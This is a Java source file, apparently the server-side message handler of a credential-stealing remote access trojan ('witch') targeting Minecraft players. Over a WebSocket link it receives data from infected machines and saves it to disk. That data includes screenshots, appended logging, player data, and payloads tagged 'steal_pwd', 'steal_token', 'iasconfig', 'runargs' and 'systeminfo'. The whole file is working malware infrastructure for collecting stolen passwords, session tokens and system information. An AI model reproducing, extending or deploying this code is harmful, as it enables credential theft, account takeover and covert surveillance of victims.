package me.soda.witch.server.handlers;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import me.soda.witch.server.server.Info;
import me.soda.witch.server.server.Message;
import me.soda.witch.server.server.Server;
import org.java_websocket.WebSocket;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class MessageHandler {
    private static final Gson GSON = new Gson();

    public static void handleRaw(byte[] bytes, WebSocket conn, Server server) {
        Info info = server.clientMap.get(conn);
        handle(info.decrypt(bytes, server), conn, server);
    }

    @SuppressWarnings("ResultOfMethodCallIgnored")
    public static void handle(Message message, WebSocket conn, Server server) {
        int id = conn.<Integer>getAttachment();
        server.log("* Received message: " + message + " From ID " + id);
        String msgType = message.messageType();
        String msg = message.message();
        try {
            switch (msgType) {
                case "screenshot" -> {
                    File file = new File("screenshots", getFileName("id", "png", String.valueOf(id), true));
                    new File("screenshots").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(GSON.fromJson(message.message(), byte[].class));
                    out.close();
                }
                case "skin" -> {
                    String playerName = server.clientMap.get(conn).playerData.get("playerName").getAsString();
                    File file = new File("skins", getFileName(playerName, "png", String.valueOf(id), false));
                    new File("skins").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(GSON.fromJson(message.message(), byte[].class));
                    out.close();
                }
                case "logging" -> {
                    File file = new File("logging", getFileName("id", "log", String.valueOf(id), false));
                    new File("logging").mkdir();
                    file.createNewFile();
                    FileInputStream in = new FileInputStream(file);
                    String oldInfo = new String(in.readAllBytes(), StandardCharsets.UTF_8);
                    in.close();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write((oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                    out.close();
                }
                case "player" -> {
                    server.clientMap.get(conn).playerData = new Gson().fromJson(msg, JsonObject.class);
                }
                case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo" -> {
                    String ext = msgType.equals("systeminfo") ? "txt" : "json";
                    File file = new File("data", getFileName(msgType, ext, server.clientMap.get(conn).playerData.get("playerName").getAsString(), true));
                    new File("data").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(msg.getBytes(StandardCharsets.UTF_8));
                    out.close();
                }
                case "xor" -> {

                }
                default -> server.log("Message: " + msgType + " " + msg);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }
}
